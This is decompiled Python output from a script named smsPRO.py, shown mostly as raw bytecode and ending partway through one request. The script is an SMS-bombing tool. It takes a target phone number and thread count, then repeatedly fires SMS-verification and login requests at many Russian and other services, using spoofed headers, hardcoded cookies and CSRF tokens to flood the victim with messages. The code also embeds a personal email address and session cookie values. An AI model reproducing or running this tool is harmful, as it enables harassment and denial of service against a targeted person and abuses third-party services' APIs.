# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: smsPRO.py
import requests
from threading import Thread
from termcolor import colored
m1 = 'Message has been sent.'
m2 = 'Message has not been sent.'
currT = 1
print(colored('\n╔╗╔╗╔══╗\n║╔╗║║║║║\n║╚╝╚╣╚╝║\n║╔═╗╠═╗║  \n║╚═╝║╔╝║\n╚═══╝╚═╝\n╔═══╦╗╔╦══╦══╦═══╦╗╔╦═══╦╗─╔╦═══╗\n║╔═╗║║║║╔╗║╔═╣╔═╗║║║║╔══╣╚═╝║╔══╝\n║╚═╝║╚╝║║║║╚═╣╚═╝║╚╝║╚══╣╔╗─║╚══╗\n║╔══╣╔╗║║║╠═╗║╔══╣╔╗║╔══╣║╚╗║╔══╝\n║║──║║║║╚╝╠═╝║║──║║║║╚══╣║─║║╚══╗\n╚╝──╚╝╚╩══╩══╩╝──╚╝╚╩═══╩╝─╚╩═══╝', 'cyan'))
print(colored('Pro', 'red'))
phone = input('\nPhone Number:')
if phone[0:3] == '+79':
    countT = int(input('Count of threads:'))

def main--- This code section failed: ---

 L.  25       0_2  SETUP_LOOP         2188  'to 2188'

 L.  26       4_6  SETUP_EXCEPT       2140  'to 2140'

 L.  27         8  LOAD_GLOBAL              phone
               10  LOAD_CONST               0
               12  LOAD_CONST               3
               14  BUILD_SLICE_2         2 
               16  BINARY_SUBSCR    
               18  LOAD_STR                 '+79'
               20  COMPARE_OP               ==
            22_24  POP_JUMP_IF_FALSE  1432  'to 1432'

 L.  28        26  LOAD_GLOBAL              requests
               28  LOAD_ATTR                post
               30  LOAD_STR                 'https://api.sunlight.net/v3/customers/authorization/'
               32  LOAD_STR                 'phone'
               34  LOAD_GLOBAL              phone
               36  LOAD_CONST               1
               38  LOAD_CONST               None
               40  BUILD_SLICE_2         2 
               42  BINARY_SUBSCR    
               44  BUILD_MAP_1           1 
               46  LOAD_STR                 'gzip, deflate, br'
               48  LOAD_STR                 'en-US,en;q=0.5'
               50  LOAD_STR                 'keep-alive'
               52  LOAD_STR                 '_fbp=1548089029383;_ga=GA1.2.1643496723.1548089014;_gat_owox=1;_gat_test=1;_gcl_au=1.1.541266814.1548089013;_gid=GA1.2.339032438.1548089014;_ym_d=1548089016;_ym_isad=2;_ym_uid=1548089016524397773;_ym_visorc_5901091=w;c_medium=referral;c_source=www.google.com;cto_lwid;region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad;region_subdomain='
               54  LOAD_STR                 'api.sunlight.net'
               56  LOAD_STR                 'https://sunlight.net'
               58  LOAD_STR                 'https://sunlight.net/profile/login/'
               60  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
               62  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Origin', 'Referer', 'User-Agent')
               64  BUILD_CONST_KEY_MAP_8     8 
               66  LOAD_CONST               ('data', 'headers')
               68  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               70  STORE_FAST               'rSL'

 L.  29        72  LOAD_FAST                'rSL'
               74  LOAD_ATTR                status_code
               76  LOAD_CONST               200
               78  COMPARE_OP               ==
               80  POP_JUMP_IF_FALSE    98  'to 98'

 L.  30        82  LOAD_GLOBAL              print
               84  LOAD_GLOBAL              colored
               86  LOAD_GLOBAL              m1
               88  LOAD_STR                 'green'
               90  CALL_FUNCTION_2       2  '2 positional arguments'
               92  CALL_FUNCTION_1       1  '1 positional argument'
               94  POP_TOP          
               96  JUMP_FORWARD        112  'to 112'
             98_0  COME_FROM            80  '80'

 L.  32        98  LOAD_GLOBAL              print
              100  LOAD_GLOBAL              colored
              102  LOAD_GLOBAL              m2
              104  LOAD_STR                 'red'
              106  CALL_FUNCTION_2       2  '2 positional arguments'
              108  CALL_FUNCTION_1       1  '1 positional argument'
              110  POP_TOP          
            112_0  COME_FROM            96  '96'

 L.  33       112  LOAD_GLOBAL              requests
              114  LOAD_ATTR                post
              116  LOAD_STR                 'https://api.fex.net/api/v1/auth/scaffold'
              118  LOAD_STR                 'phone'
              120  LOAD_GLOBAL              phone
              122  LOAD_CONST               1
              124  LOAD_CONST               None
              126  BUILD_SLICE_2         2 
              128  BINARY_SUBSCR    
              130  BUILD_MAP_1           1 
              132  LOAD_STR                 'gzip, deflate, br'
              134  LOAD_STR                 'en-US,en;q=0.5'
              136  LOAD_STR                 'kepp-alive'
              138  LOAD_STR                 '_ga=GA1.2.1166716131.1550503357;_gid=GA1.2.807690535.1550503357;alt-register-code=406701;cid=6659361518671092072;G_ENABLED_IDPS=goole;'
              140  LOAD_STR                 'api.fex.net'
              142  LOAD_STR                 'https://fex.net'
              144  LOAD_STR                 'https://fex.net/login'
              146  LOAD_STR                 'Trailers'
              148  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              150  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Origin', 'Referer', 'TE', 'User-Agent')
              152  BUILD_CONST_KEY_MAP_9     9 
              154  LOAD_CONST               ('data', 'headers')
              156  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              158  STORE_FAST               'rFN'

 L.  34       160  LOAD_FAST                'rFN'
              162  LOAD_ATTR                status_code
              164  LOAD_CONST               200
              166  COMPARE_OP               ==
              168  POP_JUMP_IF_FALSE   186  'to 186'

 L.  35       170  LOAD_GLOBAL              print
              172  LOAD_GLOBAL              colored
              174  LOAD_GLOBAL              m1
              176  LOAD_STR                 'green'
              178  CALL_FUNCTION_2       2  '2 positional arguments'
              180  CALL_FUNCTION_1       1  '1 positional argument'
              182  POP_TOP          
              184  JUMP_FORWARD        200  'to 200'
            186_0  COME_FROM           168  '168'

 L.  37       186  LOAD_GLOBAL              print
              188  LOAD_GLOBAL              colored
              190  LOAD_GLOBAL              m2
              192  LOAD_STR                 'red'
              194  CALL_FUNCTION_2       2  '2 positional arguments'
              196  CALL_FUNCTION_1       1  '1 positional argument'
              198  POP_TOP          
            200_0  COME_FROM           184  '184'

 L.  38       200  LOAD_GLOBAL              requests
              202  LOAD_ATTR                post
              204  LOAD_STR                 'https://api-production.viasat.ru/api/v1/auth_codes'
              206  LOAD_STR                 'msisdn'
              208  LOAD_GLOBAL              phone
              210  BUILD_MAP_1           1 
              212  LOAD_STR                 'gzip, deflate, br'
              214  LOAD_STR                 'ru'
              216  LOAD_STR                 'keep-alive'
              218  LOAD_STR                 'api-production.viasat.ru'
              220  LOAD_STR                 'https://vipplay.ru'
              222  LOAD_STR                 'https://vipplay.ru/'
              224  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              226  LOAD_STR                 'XMLHttpRequest'
              228  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'Origin', 'Referer', 'User-Agent', 'X-Requested-With')
              230  BUILD_CONST_KEY_MAP_8     8 
              232  LOAD_CONST               ('data', 'headers')
              234  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              236  STORE_FAST               'rVI'

 L.  39       238  LOAD_FAST                'rVI'
              240  LOAD_ATTR                status_code
              242  LOAD_CONST               204
              244  COMPARE_OP               ==
          246_248  POP_JUMP_IF_FALSE   266  'to 266'

 L.  40       250  LOAD_GLOBAL              print
              252  LOAD_GLOBAL              colored
              254  LOAD_GLOBAL              m1
              256  LOAD_STR                 'green'
              258  CALL_FUNCTION_2       2  '2 positional arguments'
              260  CALL_FUNCTION_1       1  '1 positional argument'
              262  POP_TOP          
              264  JUMP_FORWARD        280  'to 280'
            266_0  COME_FROM           246  '246'

 L.  42       266  LOAD_GLOBAL              print
              268  LOAD_GLOBAL              colored
              270  LOAD_GLOBAL              m2
              272  LOAD_STR                 'red'
              274  CALL_FUNCTION_2       2  '2 positional arguments'
              276  CALL_FUNCTION_1       1  '1 positional argument'
              278  POP_TOP          
            280_0  COME_FROM           264  '264'

 L.  43       280  LOAD_GLOBAL              requests
              282  LOAD_METHOD              session
              284  CALL_METHOD_0         0  '0 positional arguments'
              286  STORE_FAST               'clDC'

 L.  44       288  LOAD_FAST                'clDC'
              290  LOAD_METHOD              get
              292  LOAD_STR                 'https://www.delivery-club.ru/'
              294  CALL_METHOD_1         1  '1 positional argument'
              296  POP_TOP          

 L.  45       298  LOAD_GLOBAL              requests
              300  LOAD_ATTR                post
              302  LOAD_STR                 'https://www.delivery-club.ru/ajax/user_otp'
              304  LOAD_STR                 'phone'
              306  LOAD_GLOBAL              phone
              308  LOAD_CONST               1
              310  LOAD_CONST               None
              312  BUILD_SLICE_2         2 
              314  BINARY_SUBSCR    
              316  BUILD_MAP_1           1 
              318  LOAD_STR                 'gzip, deflate, br'
              320  LOAD_STR                 'en-US,en;q=0.5'
              322  LOAD_STR                 'keep-alive'
              324  LOAD_STR                 '__sonar=9096940928659092945;__zlcmid=qvi1moOuMZLrn2;_dc_gtm_UA-9598444-2=1;_delivery_menu_fullsize_photo_experiment=1;_delivery_visitor_cookie='
              326  LOAD_FAST                'clDC'
              328  LOAD_ATTR                cookies
              330  LOAD_STR                 '_delivery_visitor_cookie'
              332  BINARY_SUBSCR    
              334  BINARY_ADD       
              336  LOAD_STR                 ';_fbp=fb.1.1550525573507.680207634;=_ga=GA1.2.2064764937.1550525569;_gat_UA-9598444-2=1;_gid=GA1.2.609143235.1550525569;advcake_session=1;cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=ca775657-38ee-4429-bdcd-ec1cbcbf526c;dcse=0;FD_ab_group='
              338  BINARY_ADD       
              340  LOAD_FAST                'clDC'
              342  LOAD_ATTR                cookies
              344  LOAD_STR                 'FD_ab_group'
              346  BINARY_SUBSCR    
              348  BINARY_ADD       
              350  LOAD_STR                 ';flocktory-uuid=a375726b-df59-42a8-9e34-027e98edabdc-6;gdeslon.ru.user_id=1c93ee6e-3a34-46e4-a334-caa05d8d8a24;mr1lad=5c6b24b05b4e8a9d-300-300-;PHPSESSID='
              352  BINARY_ADD       
              354  LOAD_FAST                'clDC'
              356  LOAD_ATTR                cookies
              358  LOAD_STR                 'PHPSESSID'
              360  BINARY_SUBSCR    
              362  BINARY_ADD       
              364  LOAD_STR                 ';smartbanner-full-shown=true;tmr_detect=0|1550525571650;user_unic_ac_id=af6bbe6e-e6fa-e625-a93f-a7d82c3a9661;visitor_identifier='
              366  BINARY_ADD       
              368  LOAD_FAST                'clDC'
              370  LOAD_ATTR                cookies
              372  LOAD_STR                 'visitor_identifier'
              374  BINARY_SUBSCR    
              376  BINARY_ADD       
              378  LOAD_STR                 ';'
              380  BINARY_ADD       
              382  LOAD_STR                 'www.delivery-club.ru'
              384  LOAD_STR                 'https://www.delivery-club.ru/'
              386  LOAD_STR                 'Trailers'
              388  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              390  LOAD_STR                 'xGO8d6jEwUVpY2GZKeNxUsTRFN5SQj1htcXpxePlc08'
              392  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'TE', 'User-Agent', 'X-CSRF-Token')
              394  BUILD_CONST_KEY_MAP_9     9 
              396  LOAD_CONST               ('data', 'headers')
              398  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              400  STORE_FAST               'rDC'

 L.  46       402  LOAD_FAST                'rDC'
              404  LOAD_ATTR                status_code
              406  LOAD_CONST               200
              408  COMPARE_OP               ==
          410_412  POP_JUMP_IF_FALSE   430  'to 430'

 L.  47       414  LOAD_GLOBAL              print
              416  LOAD_GLOBAL              colored
              418  LOAD_GLOBAL              m1
              420  LOAD_STR                 'green'
              422  CALL_FUNCTION_2       2  '2 positional arguments'
              424  CALL_FUNCTION_1       1  '1 positional argument'
              426  POP_TOP          
              428  JUMP_FORWARD        444  'to 444'
            430_0  COME_FROM           410  '410'

 L.  49       430  LOAD_GLOBAL              print
              432  LOAD_GLOBAL              colored
              434  LOAD_GLOBAL              m2
              436  LOAD_STR                 'red'
              438  CALL_FUNCTION_2       2  '2 positional arguments'
              440  CALL_FUNCTION_1       1  '1 positional argument'
              442  POP_TOP          
            444_0  COME_FROM           428  '428'

 L.  50       444  LOAD_GLOBAL              requests
              446  LOAD_METHOD              session
              448  CALL_METHOD_0         0  '0 positional arguments'
              450  STORE_FAST               'clGT'

 L.  51       452  LOAD_FAST                'clGT'
              454  LOAD_METHOD              get
              456  LOAD_STR                 'https://driver.gett.ru/signup/'
              458  CALL_METHOD_1         1  '1 positional argument'
              460  POP_TOP          

 L.  52       462  LOAD_GLOBAL              requests
              464  LOAD_ATTR                post
              466  LOAD_STR                 'https://driver.gett.ru/api/login/phone/'
              468  LOAD_GLOBAL              phone
              470  LOAD_STR                 'true'
              472  LOAD_CONST               ('phone', 'registration')
              474  BUILD_CONST_KEY_MAP_2     2 
              476  LOAD_STR                 'gzip, deflate, br'
              478  LOAD_STR                 'en-US,en;q=0.5'
              480  LOAD_STR                 'keep-alive'
              482  LOAD_STR                 'csrftoken='
              484  LOAD_FAST                'clGT'
              486  LOAD_ATTR                cookies
              488  LOAD_STR                 'csrftoken'
              490  BINARY_SUBSCR    
              492  BINARY_ADD       
              494  LOAD_STR                 '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2'
              496  BINARY_ADD       
              498  LOAD_STR                 'driver.gett.ru'
              500  LOAD_STR                 'https://driver.gett.ru/signup/'
              502  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              504  LOAD_FAST                'clGT'
              506  LOAD_ATTR                cookies
              508  LOAD_STR                 'csrftoken'
              510  BINARY_SUBSCR    
              512  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-CSRFToken')
              514  BUILD_CONST_KEY_MAP_8     8 
              516  LOAD_CONST               ('data', 'headers')
              518  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              520  STORE_FAST               'rGT'

 L.  53       522  LOAD_FAST                'rGT'
              524  LOAD_ATTR                status_code
              526  LOAD_CONST               200
              528  COMPARE_OP               ==
          530_532  POP_JUMP_IF_FALSE   550  'to 550'

 L.  54       534  LOAD_GLOBAL              print
              536  LOAD_GLOBAL              colored
              538  LOAD_GLOBAL              m1
              540  LOAD_STR                 'green'
              542  CALL_FUNCTION_2       2  '2 positional arguments'
              544  CALL_FUNCTION_1       1  '1 positional argument'
              546  POP_TOP          
              548  JUMP_FORWARD        564  'to 564'
            550_0  COME_FROM           530  '530'

 L.  56       550  LOAD_GLOBAL              print
              552  LOAD_GLOBAL              colored
              554  LOAD_GLOBAL              m2
              556  LOAD_STR                 'red'
              558  CALL_FUNCTION_2       2  '2 positional arguments'
              560  CALL_FUNCTION_1       1  '1 positional argument'
              562  POP_TOP          
            564_0  COME_FROM           548  '548'

 L.  57       564  LOAD_GLOBAL              requests
              566  LOAD_METHOD              session
              568  CALL_METHOD_0         0  '0 positional arguments'
              570  STORE_FAST               'clDV'

 L.  58       572  LOAD_FAST                'clDV'
              574  LOAD_METHOD              get
              576  LOAD_STR                 'https://drugvokrug.ru/siteActions/processSms.htm'
              578  CALL_METHOD_1         1  '1 positional argument'
              580  POP_TOP          

 L.  59       582  LOAD_GLOBAL              requests
              584  LOAD_ATTR                post
              586  LOAD_STR                 'https://drugvokrug.ru/siteActions/processSms.htm'
              588  LOAD_STR                 'cell'
              590  LOAD_GLOBAL              phone
              592  LOAD_CONST               1
              594  LOAD_CONST               None
              596  BUILD_SLICE_2         2 
              598  BINARY_SUBSCR    
              600  BUILD_MAP_1           1 
              602  LOAD_STR                 'en-US,en;q=0.5'
              604  LOAD_STR                 'keep-alive'
              606  LOAD_STR                 'JSESSIONID='
              608  LOAD_FAST                'clDV'
              610  LOAD_ATTR                cookies
              612  LOAD_STR                 'JSESSIONID'
              614  BINARY_SUBSCR    
              616  BINARY_ADD       
              618  LOAD_STR                 ';'
              620  BINARY_ADD       
              622  LOAD_STR                 'drugvokrug.ru'
              624  LOAD_STR                 'https://drugvokrug.ru/'
              626  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              628  LOAD_STR                 'XMLHttpRequest'
              630  LOAD_CONST               ('Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Requested-With')
              632  BUILD_CONST_KEY_MAP_7     7 
              634  LOAD_CONST               ('data', 'headers')
              636  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              638  STORE_FAST               'rDV'

 L.  60       640  LOAD_FAST                'rDV'
              642  LOAD_ATTR                status_code
              644  LOAD_CONST               200
              646  COMPARE_OP               ==
          648_650  POP_JUMP_IF_FALSE   668  'to 668'

 L.  61       652  LOAD_GLOBAL              print
              654  LOAD_GLOBAL              colored
              656  LOAD_GLOBAL              m1
              658  LOAD_STR                 'green'
              660  CALL_FUNCTION_2       2  '2 positional arguments'
              662  CALL_FUNCTION_1       1  '1 positional argument'
              664  POP_TOP          
              666  JUMP_FORWARD        682  'to 682'
            668_0  COME_FROM           648  '648'

 L.  63       668  LOAD_GLOBAL              print
              670  LOAD_GLOBAL              colored
              672  LOAD_GLOBAL              m2
              674  LOAD_STR                 'red'
              676  CALL_FUNCTION_2       2  '2 positional arguments'
              678  CALL_FUNCTION_1       1  '1 positional argument'
              680  POP_TOP          
            682_0  COME_FROM           666  '666'

 L.  64       682  LOAD_GLOBAL              requests
              684  LOAD_ATTR                post
              686  LOAD_STR                 'https://b.utair.ru/api/v1/login/'
              688  LOAD_STR                 'login'
              690  LOAD_GLOBAL              phone
              692  BUILD_MAP_1           1 
              694  LOAD_STR                 'gzip, deflate, br'
              696  LOAD_STR                 'en-US,en;q=0.5'
              698  LOAD_STR                 'keep-alive'
              700  LOAD_STR                 'b.utair.ru'
              702  LOAD_STR                 'https://www.utair.ru'
              704  LOAD_STR                 'https://www.utair.ru/'
              706  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Host', 'origin', 'Referer')
              708  BUILD_CONST_KEY_MAP_6     6 
              710  LOAD_CONST               ('data', 'headers')
              712  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              714  STORE_FAST               'rUT'

 L.  65       716  LOAD_FAST                'rUT'
              718  LOAD_ATTR                status_code
              720  LOAD_CONST               200
              722  COMPARE_OP               ==
          724_726  POP_JUMP_IF_FALSE   744  'to 744'

 L.  66       728  LOAD_GLOBAL              print
              730  LOAD_GLOBAL              colored
              732  LOAD_GLOBAL              m1
              734  LOAD_STR                 'green'
              736  CALL_FUNCTION_2       2  '2 positional arguments'
              738  CALL_FUNCTION_1       1  '1 positional argument'
              740  POP_TOP          
              742  JUMP_FORWARD        758  'to 758'
            744_0  COME_FROM           724  '724'

 L.  68       744  LOAD_GLOBAL              print
              746  LOAD_GLOBAL              colored
              748  LOAD_GLOBAL              m2
              750  LOAD_STR                 'red'
              752  CALL_FUNCTION_2       2  '2 positional arguments'
              754  CALL_FUNCTION_1       1  '1 positional argument'
              756  POP_TOP          
            758_0  COME_FROM           742  '742'

 L.  69       758  LOAD_GLOBAL              requests
              760  LOAD_ATTR                post
              762  LOAD_STR                 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
              764  LOAD_GLOBAL              phone
              766  LOAD_CONST               1
              768  LOAD_CONST               None
              770  BUILD_SLICE_2         2 
              772  BINARY_SUBSCR    
              774  LOAD_STR                 'ID'
              776  LOAD_STR                 'Alexey'
              778  LOAD_STR                 'alexey173949@gmail.com'
              780  LOAD_STR                 '*'
              782  LOAD_CONST               ('phoneNumber', 'countryCode', 'name', 'email', 'deviceToken')
              784  BUILD_CONST_KEY_MAP_5     5 
              786  LOAD_STR                 'User-Agent'
              788  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
              790  BUILD_MAP_1           1 
              792  LOAD_CONST               ('data', 'headers')
              794  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              796  STORE_FAST               'rGRAB'

 L.  70       798  LOAD_FAST                'rGRAB'
              800  LOAD_ATTR                status_code
              802  LOAD_CONST               200
              804  COMPARE_OP               ==
          806_808  POP_JUMP_IF_FALSE   826  'to 826'

 L.  71       810  LOAD_GLOBAL              print
              812  LOAD_GLOBAL              colored
              814  LOAD_GLOBAL              m1
              816  LOAD_STR                 'green'
              818  CALL_FUNCTION_2       2  '2 positional arguments'
              820  CALL_FUNCTION_1       1  '1 positional argument'
              822  POP_TOP          
              824  JUMP_FORWARD        840  'to 840'
            826_0  COME_FROM           806  '806'

 L.  73       826  LOAD_GLOBAL              print
              828  LOAD_GLOBAL              colored
              830  LOAD_GLOBAL              m2
              832  LOAD_STR                 'red'
              834  CALL_FUNCTION_2       2  '2 positional arguments'
              836  CALL_FUNCTION_1       1  '1 positional argument'
              838  POP_TOP          
            840_0  COME_FROM           824  '824'

 L.  74       840  LOAD_GLOBAL              requests
              842  LOAD_METHOD              session
              844  CALL_METHOD_0         0  '0 positional arguments'
              846  STORE_FAST               'cl'

 L.  75       848  LOAD_FAST                'cl'
              850  LOAD_METHOD              get
              852  LOAD_STR                 'https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp'
              854  CALL_METHOD_1         1  '1 positional argument'
              856  POP_TOP          

 L.  76       858  LOAD_GLOBAL              requests
              860  LOAD_ATTR                post
              862  LOAD_STR                 'https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp'
              864  LOAD_STR                 'phone'
              866  LOAD_GLOBAL              phone
              868  LOAD_CONST               2
              870  LOAD_CONST               None
              872  BUILD_SLICE_2         2 
              874  BINARY_SUBSCR    
              876  BUILD_MAP_1           1 
              878  LOAD_STR                 'gzip, deflate, br'
              880  LOAD_STR                 'en-US,en;q=0.5'
              882  LOAD_STR                 'keep-alive'
              884  LOAD_STR                 '__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='
              886  LOAD_FAST                'cl'
              888  LOAD_ATTR                cookies
              890  LOAD_STR                 'BIGipServeratg-ps-prod_tcp80'
              892  BINARY_SUBSCR    
              894  BINARY_ADD       
              896  LOAD_STR                 ';bIPs='
              898  BINARY_ADD       
              900  LOAD_FAST                'cl'
              902  LOAD_ATTR                cookies
              904  LOAD_STR                 'bIPs'
              906  BINARY_SUBSCR    
              908  BINARY_ADD       
              910  LOAD_STR                 ';CACHE_INDICATOR='
              912  BINARY_ADD       
              914  LOAD_FAST                'cl'
              916  LOAD_ATTR                cookies
              918  LOAD_STR                 'CACHE_INDICATOR'
              920  BINARY_SUBSCR    
              922  BINARY_ADD       
              924  LOAD_STR                 ';COMPARISON_INDICATOR='
              926  BINARY_ADD       
              928  LOAD_FAST                'cl'
              930  LOAD_ATTR                cookies
              932  LOAD_STR                 'COMPARISON_INDICATOR'
              934  BINARY_SUBSCR    
              936  BINARY_ADD       
              938  LOAD_STR                 ';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='
              940  BINARY_ADD       
              942  LOAD_FAST                'cl'
              944  LOAD_ATTR                cookies
              946  LOAD_STR                 'flacktory'
              948  BINARY_SUBSCR    
              950  BINARY_ADD       
              952  LOAD_STR                 ';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'
              954  BINARY_ADD       
              956  LOAD_FAST                'cl'
              958  LOAD_ATTR                cookies
              960  LOAD_STR                 'JSESSIONID'
              962  BINARY_SUBSCR    
              964  BINARY_ADD       
              966  LOAD_STR                 ';MVID_CITY_ID='
              968  BINARY_ADD       
              970  LOAD_FAST                'cl'
              972  LOAD_ATTR                cookies
              974  LOAD_STR                 'MVID_CITY_ID'
              976  BINARY_SUBSCR    
              978  BINARY_ADD       
              980  LOAD_STR                 ';MVID_GUEST_ID='
              982  BINARY_ADD       
              984  LOAD_FAST                'cl'
              986  LOAD_ATTR                cookies
              988  LOAD_STR                 'MVID_GUEST_ID'
              990  BINARY_SUBSCR    
              992  BINARY_ADD       
              994  LOAD_STR                 ';MVID_VIEWED_PRODUCTS='
              996  BINARY_ADD       
              998  LOAD_STR                 ';tmr_detect=0|1548089556738;TS0102af22='
             1000  BINARY_ADD       
             1002  LOAD_FAST                'cl'
             1004  LOAD_ATTR                cookies
             1006  LOAD_STR                 'TS0102af22'
             1008  BINARY_SUBSCR    
             1010  BINARY_ADD       
             1012  LOAD_STR                 ';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='
             1014  BINARY_ADD       
             1016  LOAD_FAST                'cl'
             1018  LOAD_ATTR                cookies
             1020  LOAD_STR                 'TS01189d65'
             1022  BINARY_SUBSCR    
             1024  BINARY_ADD       
             1026  LOAD_STR                 ';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;'
             1028  BINARY_ADD       
             1030  LOAD_STR                 'www.mvideo.ru'
             1032  LOAD_STR                 'https://www.mvideo.ru/register?sn=false'
             1034  LOAD_STR                 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             1036  LOAD_STR                 'XMLHttpRequest'
             1038  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Requested-With')
             1040  BUILD_CONST_KEY_MAP_8     8 
             1042  LOAD_CONST               ('data', 'headers')
             1044  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1046  STORE_FAST               'rAP'

 L.  77      1048  LOAD_FAST                'rAP'
             1050  LOAD_ATTR                status_code
             1052  LOAD_CONST               200
             1054  COMPARE_OP               ==
         1056_1058  POP_JUMP_IF_FALSE  1076  'to 1076'

 L.  78      1060  LOAD_GLOBAL              print
             1062  LOAD_GLOBAL              colored
             1064  LOAD_GLOBAL              m1
             1066  LOAD_STR                 'green'
             1068  CALL_FUNCTION_2       2  '2 positional arguments'
             1070  CALL_FUNCTION_1       1  '1 positional argument'
             1072  POP_TOP          
             1074  JUMP_FORWARD       1090  'to 1090'
           1076_0  COME_FROM          1056  '1056'

 L.  80      1076  LOAD_GLOBAL              print
             1078  LOAD_GLOBAL              colored
             1080  LOAD_GLOBAL              m2
             1082  LOAD_STR                 'red'
             1084  CALL_FUNCTION_2       2  '2 positional arguments'
             1086  CALL_FUNCTION_1       1  '1 positional argument'
             1088  POP_TOP          
           1090_0  COME_FROM          1074  '1074'

 L.  81      1090  LOAD_GLOBAL              requests
             1092  LOAD_ATTR                post
             1094  LOAD_STR                 'https://m.taxi.yandex.ru/3.0/auth/'
             1096  LOAD_STR                 '08f84247220c36d308c802736dcc58af'
             1098  LOAD_GLOBAL              phone
             1100  LOAD_CONST               ('id', 'phone')
             1102  BUILD_CONST_KEY_MAP_2     2 
             1104  LOAD_STR                 'gzip, deflate, br'
             1106  LOAD_STR                 'ru-RU'
             1108  LOAD_STR                 'keep-alive'
             1110  LOAD_STR                 '_id=7a7cd323a887d891192610c9c3406349;_ym_d=1552824752;_ym_isad=2;_ym_uid=1552824752982775742;_ym_wasSynced=%7B%22time%22%3A1552850261519%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;fuid01=5c8d8dd2118e8d4a.ZzYLCgUwHZG-G2j-tu141V5dkl9qQ8_w0KW_80u0cW9AGB2dB9ood4s6uivmMu_w8emgBKjrEUMIkrS2G3D6jJJi3BdcD7hmw_YEqPADgSvNO2Lp8AwxQAvZSWDTjyFR;gdpr=1;i=y+LF5v3Aclb2XpLoSvwahQquBla32PYbdEAnObsu/DfHtJ+rCJqo6VQMq9tJtCjYpoRTzU8L9SvPnR57dqJ1qjrBRzs=;mda=0;yandexuid=536383211552780201;yp=1584316206.yrts.1552780206#1584316206.yrtsi.1552780206;'
             1112  LOAD_STR                 'm.taxi.yandex.ru'
             1114  LOAD_STR                 'https://m.taxi.yandex.ru/'
             1116  LOAD_STR                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'
             1118  LOAD_STR                 'XMLHttpRequest'
             1120  LOAD_STR                 'https://m.taxi.yandex.ru/'
             1122  LOAD_CONST               ('Accept-Encoding', 'Accept-Language', 'Connection', 'Cookie', 'Host', 'Referer', 'User-Agent', 'X-Requested-With', 'x-requested-uri')
